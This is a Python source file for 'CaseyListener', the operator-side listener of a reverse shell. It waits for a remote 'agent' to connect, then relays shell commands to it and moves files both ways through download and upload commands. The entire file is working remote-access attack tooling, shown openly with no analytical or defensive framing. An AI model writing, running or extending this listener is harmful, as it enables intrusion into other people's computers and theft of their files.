import socket, re, base64, struct, os
from termcolor import colored

class CaseyListener:
    def __init__(self):
        lhost = input(f"[+] Please enter the IP address of the listening host: ")
        port = input(f"[+] Please enter the port number to recieve the connection from the agent: ")
        soc = socket.socket()
        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        soc.bind((lhost, int(port)))
        soc.listen()
        print(f"\n[+] Listening for incoming connection on port {port}...")
        
        self.session, addr = soc.accept()
        print(f"[+] Connection recieved from {addr} on port {port}.\n")


    def recv_prompt(self):
        prompt = self.session.recv(4096)
        return prompt.decode()


    def send_cmd(self):
        prompt = colored(self.recv_prompt(), attrs=['bold'])
        cmd = ""
        while (cmd == ""):
            cmd = input(f"{prompt}")
            cmd_chunks = cmd.split(' ')

        if cmd == "exit" or cmd == "quit":
            self.session.send(cmd.encode())
            self.session.close()
            exit()
        elif cmd_chunks[0].lower() == "download" and len(cmd_chunks) > 1:
            self.session.send(cmd.encode())
            path = re.sub('"|\'', '', cmd[9:])
            file_name = path.split('\\')[-1]
            file_content = self.recv_cmd_result()
            self.write_file(file_name, file_content)
            return "File downloaded"
        elif cmd_chunks[0].lower() == "upload" and len(cmd_chunks) > 1:
            path = re.sub('"|\'', '', cmd[7:])
            file_name = path.split('\\')[-1]
            file_size = os.path.getsize(file_name)
            upload_cmd = f"upload {file_name} {file_size}"
            self.session.send(upload_cmd.encode())
            with open(path, "rb") as file:
                size = 0
                while size < file_size:
                    file_content = file.read(4096)
                    if file_content == None:
                        break
                    self.session.sendall(file_content)
                    size += len(file_content)
        else:
            self.session.send(cmd.encode())


    def recvall(self, n):
        result = bytearray()
        while len(result) < n:
            packet = self.session.recv(n - len(result))
            if not packet:
                return None
            result.extend(packet)
        return result


    def recv_cmd_result(self):
        raw_resultlen = self.recvall(4)
        if not raw_resultlen:
            return None
        resultlen = struct.unpack('>I', raw_resultlen)[0]
        return self.recvall(resultlen).decode()

    
    def write_file(self, file_name, content):
        with open(file_name, "wb") as file:
            file.write(base64.b64decode(content))


    def run(self):
        while True:
            cmd_feedback = self.send_cmd()

            if cmd_feedback == "File downloaded":
                print("[+] Download successful\n")
            else:
                print(self.recv_cmd_result())



listener = CaseyListener()
listener.run()
